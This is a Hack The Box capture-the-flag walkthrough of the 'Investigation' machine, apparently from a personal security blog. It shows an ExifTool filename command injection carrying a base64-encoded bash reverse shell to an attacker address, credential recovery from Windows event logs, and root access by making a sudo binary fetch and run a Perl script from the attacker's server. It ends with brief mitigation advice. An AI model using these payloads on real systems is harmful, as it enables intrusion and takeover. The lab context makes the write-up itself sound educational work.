---
layout: post
title: Hack The Box Walkthrough - Investigation
date: 2023-02-12
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Medium
- Machine
permalink: /2023/02/HTB/Investigation
img: 2023/02/Investigation/Investigation.png
---

In this machine, I had to exploit a known vulnerability in exiftool, find a password in some logs, and finally reverse a program to find how to exploit it.

* Room: Investigation
* Difficulty: Medium
* URL: [https://app.hackthebox.com/machines/Investigation](https://app.hackthebox.com/machines/Investigation)
* Author: [Derezzed](https://app.hackthebox.com/users/15515)

## Enumeration

I began the box by running Rustscan to look for open ports.

```bash
$ rustscan -a target -- -A | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.10.11.197:22
Open 10.10.11.197:80

Host is up, received syn-ack (0.048s latency).
Scanned at 2023-02-19 07:52:55 EST for 15s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 2f1e6306aa6ebbcc0d19d4152674c6d9 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8CUW+gkrjaTI+EeIVcW/8kCM0oaKxGk63NkzFaKj8cgPfImUg8NbMX7xSoQR2DJP88LCJWpm/7KgYyHgaI4w29TRZTGFrv1MKoALQKO/6GDUxLtoHaSA1KrXph74L9eNp/Q/xAzmjfNqLL3qCAotSUZndEWV7C7EQYj73e88Rvw+bV8mQ0O+habEygGVEFuEgOJpN0e3YM3EJoxo1N5CVJMBUJ4Jb7FoYYckIAYTZTV3fuembGRoG0Lvw6YbIOYA8URxLqcBxsMSOkznhf219fl2KXiT9Y7505L/HAeWG4NW4LAuDereMuaUDe4vWEMHYx0KH7m3UuJ7zxcPqHU7K94KW8cZVNlWjoNPDKrPTEgPDfDRlUNpVRyE87DcBgOzNGNFJHYhj2K46RKtv+TO9MjYKvC+nXFSNgPkdFaCQcfpqd61FtaVsin5Ho/v1XfhqDG0d7N7uDM28zCmNVfnl9+MI0jpBmiFaH8V0ZjR7EZlkk+7Xb3bI2Kq3KVaif7s=
|   256 274520add2faa73a8373d97c79abf30b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBG5ZpYGYsM/eNsAOYy3iQ9O7/OdK6q63GKK1bd2ZA5qhePdO+KJOOvgwxKxBXoJApVfBKV0oVn3ztPubO2mdp5g=
|   256 4245eb916e21020617b2748bc5834fe0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ4m4ta/VBtbCv+5FEPfydbXySZHyzU7ELt9lBsbjl5S
80/tcp open  http    syn-ack Apache httpd 2.4.41
|_http-title: Did not follow redirect to http://eforenzics.htb/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: Host: eforenzics.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
...
Nmap done: 1 IP address (1 host up) scanned in 15.11 seconds
```

Two ports were open:
* 22 - SSH
* 80 - HTTP

Port 80 was redirecting to 'http://eforenzics.htb/' so I added that to my hosts files. I used Feroxbuster to look for hidden files, and wfuzz to look for subdomains. They did not find anything interesting.

## File Upload

I opened the website in a browser.

![eForenzics Site](/assets/images/2023/02/Investigation/eForenzicsSite.png "eForenzics Site")

The website was mostly static. Except for the 'Free Services' page that allowed uploading files.

![File Upload](/assets/images/2023/02/Investigation/FileUpload.png "File Upload")

I tried uploading an image to the site. The image was uploaded, and I was given a link to view an analysis report on the file.

![File Uploaded](/assets/images/2023/02/Investigation/FileUploaded.png "File Uploaded")

I clicked on the link. It took me to a page that displayed the file image's metadata extracted with [ExifTool](https://exiftool.org/).

![ExifTool Results](/assets/images/2023/02/Investigation/ExifTool.png "ExifTool Results")

Seeing file uploads, I thought I might be able to get [Local File Inclusion](https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/), but I was not able to access the uploaded files, just the text file with the ExifTool results.

I tried adding PHP code to the image description, but it was not executed. I also tried to append commands after the file hoping they would be sent to the command line and executed. That also failed.

I looked for known vulnerabilities in ExifTool version 12.37 and [found one](https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429). I was trying to add commands at the end of the file name, but I had to add in at the beginning and end it with a pipe (\|).

I tried it by beginning with something simple. I could not run something like `id` because the output was not displayed. So I tried starting a web server and sending a file called `wget 10.10.14.11 |` with Burp Repeater. 

It worked. 

```bash
$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.197 - - [19/Feb/2023 09:13:26] "GET / HTTP/1.1" 200 -
```

Next, I went for a reverse shell. To minimize the risk of having issues with special characters, I started by base64 encoding my payload.

```bash
$ echo 'bash  -i >& /dev/tcp/10.10.14.8/4444  0>&1  ' | base64
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOC80NDQ0ICAwPiYxICAK
```

Then I sent it in the filename.

```
Content-Disposition: form-data; name="image"; filename="echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOC80NDQ0ICAwPiYxICAK | base64 -d | bash |"
Content-Type: application/x-php
```

I got my reverse shell.

```bash
$ nc -klvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.11.197] 46926
bash: cannot set terminal process group (959): Inappropriate ioctl for device
bash: no job control in this shell
www-data@investigation:~/uploads/1676816336$
```

## User

Once connected to the server, I saw that a cronjobs was interacting with files in '/usr/local/investigation'.

```bash
www-data@investigation:~/html$ crontab -l
...
*/5 * * * * date >> /usr/local/investigation/analysed_log && echo "Clearing folders" >> /usr/local/investigation/analysed_log && rm -r /var/www/uploads/* && rm /var/www/html/analysed_images/*
```

I looked in the folder  and saw that it contained an email about Windows Event Logs.

```bash
www-data@investigation:~/html$ ls /usr/local/investigation/
'Windows Event Logs for Analysis.msg'   analysed_log

www-data@investigation:/usr/local/investigation$ file Windows\ Event\ Logs\ for\ Analysis.msg 
Windows Event Logs for Analysis.msg: CDFV2 Microsoft Outlook Message
```

I downloaded the file to my machine to better investigate it. I installed [MSGConvert](https://www.matijs.net/software/msgconv/) to convert the email in a format that I could read. The message had an attachment. I save the base64 of the attachment in a file and decoded it, then unzipped the file in contained.

```bash
$ msgconvert logs.msg

$ vim logs.msg

$ cat b64.txt | base64 -d > evtx-logs.zip

$ file evtx-logs.zip
evtx-logs.zip: Zip archive data, at least v2.0 to extract, compression method=deflate

$ mkdir logs

$ cd logs

$ unzip ../evtx-logs.zip
Archive:  ../evtx-logs.zip
  inflating: security.evtx

$ file security.evtx
security.evtx: MS Windows 10-11 Event Log, version  3.2, 238 chunks (no. 237 in use), next record no. 20013
```


The attached file contained the Windows Security Event Logs. This file is not human-readable, so I used [evtxexport](https://manpages.ubuntu.com/manpages/bionic/en/man1/evtxexport.1.html) to extract the data in a text file.

```
$ evtxexport security.evtx > exported.txt
```

The extracted file contained 440k lines. I took a quick look at it, but there was too much to find anything. I made a quick search and found out that code 4625 was used for failed log-on events. I searched the file for this code and found one event with a password in it.


```
Event identifier        : 0x00001211 (4625)
Number of strings       : 21
String: 1               : S-1-5-18
String: 2               : EFORENZICS-DI$
String: 3               : WORKGROUP
String: 4               : 0x00000000000003e7
String: 5               : S-1-0-0
String: 6               : REDACTED
String: 7               :
```

I used the password to connect as 'smorton' and it worked.

```bash
$ ssh smorton@target
The authenticity of host 'target (10.10.11.197)' can't be established.
ED25519 key fingerprint is SHA256:lYSJubnhYfFdsTiyPfAa+pgbuxOaSJGV8ItfpUK84Vw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'target' (ED25519) to the list of known hosts.
smorton@target's password:
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-137-generic x86_64)

...

smorton@investigation:~$ ls
user.txt

smorton@investigation:~$ cat user.txt
REDACTED
```

## Root

To get to root, I looked at what the user could run with sudo.

```bash
smorton@investigation:~$ sudo -l
Matching Defaults entries for smorton on investigation:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User smorton may run the following commands on investigation:
    (root) NOPASSWD: /usr/bin/binary

smorton@investigation:~$ file /usr/bin/binary
/usr/bin/binary: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=a703575c5c944bfcfea8a04f0aabaf0b4fa9f7cb, for GNU/Linux 3.2.0, not stripped

smorton@investigation:~$ sudo /usr/bin/binary
Exiting...
```

They could execute a binary. I tried running it, but it appeared to exit immediately. I downloaded the executable to my machine and opened it in Ghidra. I renamed a few variables and added comments to make the code readable.

![Binary decompiled](/assets/images/2023/02/Investigation/BinaryDecompiled.png "Binary Decompiled")

The binary needed two arguments, a URL and a file name. The file name needed to be "lDnxUysaQn". It used curl to download from the given URL and save the content to the file specified. It then used perl to execute the file it downloaded.

It created a small perl script on my machine to run bash and launched a web server to give access to the script.

```
$ cat index.html
system('/bin/bash -p')

$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

I ran the program giving it a URL that pointed to my machine and the expected file name.

My web server got hit.

```bash
10.10.11.197 - - [19/Feb/2023 10:41:08] "GET / HTTP/1.1" 200 -
```

And I was root on the server.

```bash
smorton@investigation:~$ sudo /usr/bin/binary 10.10.14.8 "lDnxUysaQn"
Running...

root@investigation:/home/smorton# whoami
root

root@investigation:/home/smorton# cd /root

root@investigation:~# cat root.txt
REDACTED
```

## Mitigation

Making that box safer would start by keeping tools up to date. The version of exiftool on the server is outdated and has a known vulnerability. A simple update would have prevented the RCE. 

Next, there were sensitive files readable by anyone on the server. The email contained security logs. It should not be left on a server for anyone to grab it.

The last issue was with the binary that ran any code it downloaded as root. Something like this should probably not exists on a real server. Executing arbitrary code is dangerous, doing it as root is worst.